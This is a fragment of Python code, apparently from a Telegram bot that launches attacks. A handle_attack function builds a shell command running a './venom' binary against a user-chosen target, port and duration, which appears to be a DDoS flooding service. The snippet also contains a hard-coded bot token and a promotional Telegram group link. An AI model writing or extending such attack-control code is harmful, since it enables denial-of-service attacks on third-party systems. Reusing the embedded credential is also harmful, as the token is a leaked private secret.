...
bot = telebot.TeleBot('7326282713:AAFdZ-hAlwt5uE_ccCECayvnvWicLtzzmLE')
...
def handle_attack(message):
    ...
    full_command = f"./venom {target} {port} {time_duration} 400"
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/+kwKtbTUke4EwNGU1) 🚀🔥"""
